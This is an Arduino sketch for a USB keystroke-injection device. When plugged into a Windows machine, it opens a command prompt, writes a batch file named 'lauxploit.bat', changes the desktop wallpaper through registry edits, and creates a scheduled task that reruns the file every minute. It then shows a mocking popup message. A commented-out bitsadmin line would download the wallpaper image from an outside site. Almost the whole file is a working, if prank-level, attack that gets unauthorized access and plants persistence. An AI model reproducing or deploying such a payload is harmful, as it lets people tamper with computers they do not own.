#define DELAY_BEGIN 3000
#define DELAY_CMD 500
#define DELAY_TYPE 10
#define DELAY_END 300000

#include <Keyboard.h>

//char USERTARGET[8] = "ple";
int isFirstTime = 1;

void setup()
{
}

void loop()
{
  if(isFirstTime)
  { 
    Keyboard.begin();
    delay(DELAY_BEGIN);

   //Starting a standard cmd
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(DELAY_TYPE);
    Keyboard.releaseAll();
    Keyboard.println("cmd");
    Keyboard.write(KEY_RETURN);
    delay(DELAY_CMD);
  
    // Creating the reminder
    //Keyboard.println(strcat(strcat("cd C:\\Users\\",USERTARGET),"\\Pictures"));
    Keyboard.println("cd C:\\Users\\ple\\Pictures\n");
    delay(DELAY_TYPE);
    Keyboard.println("copy con lauxploit.bat\n");
    delay(DELAY_TYPE);
    // Program in the lauxploit.bat : first line
    Keyboard.println("@echo off\n");
    delay(DELAY_TYPE);
      //Necessary after first line, in order to handle "Overwrite ?" question
      Keyboard.println("Yes\n");
      delay(DELAY_TYPE);

    ////////// BODY OF LAUXPLOIT.BAT
      //Keyboard.println("bitsadmin.exe /transfer \"JobName\" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\\lvi.jpg");
    
    Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"C:\\Users\\ple\\Pictures\\lvi.jpg\" /f\n");
    delay(DELAY_TYPE);
    Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v TileWallpaper /t REG_SZ /f /d 0\n");
    delay(DELAY_TYPE);
    Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v WallpaperStyle /t REG_SZ /f /d 0\n");
    delay(DELAY_TYPE);
    for (int i = 0; i<40; i++)
    {
      Keyboard.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\n");
      delay(DELAY_TYPE);  
    }  
    /////////// END OF BODY OF LAUXPLOIT.BAT
    
    //End of writing in lauxploit.bat
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('Z');
    delay(DELAY_TYPE);
    Keyboard.releaseAll();
    Keyboard.write(KEY_RETURN);
    delay(DELAY_TYPE);
    Keyboard.write(KEY_RETURN);
    delay(DELAY_TYPE);
  
    // Schedule it : Adding the .bat to the Windows' tasks (type the number of minutes after /mo)
    Keyboard.println("schtasks /create /sc minute /mo 1 /tn \"Lauxploit\" /tr C:\\Users\\ple\\Pictures\\lauxploit.bat\n");
    delay(DELAY_TYPE);
      //Necessary after this line, in order to handle "Overwrite ?" question
      Keyboard.println("Y\n");
      delay(DELAY_TYPE);
    
    //Launch it once  
    Keyboard.println("lauxploit.bat\n");
    delay(DELAY_CMD);
    Keyboard.println("Msg * \"To my beloved OLD secret admirer, please receive this gift as a mark of my unwavering love for you\"\n");
    delay(DELAY_TYPE);
  
    // Exiting properly the console
    Keyboard.println("exit\n");
    delay(DELAY_TYPE);
    
    Keyboard.end();
    isFirstTime = 0;
  }
  
  delay(DELAY_END);
}
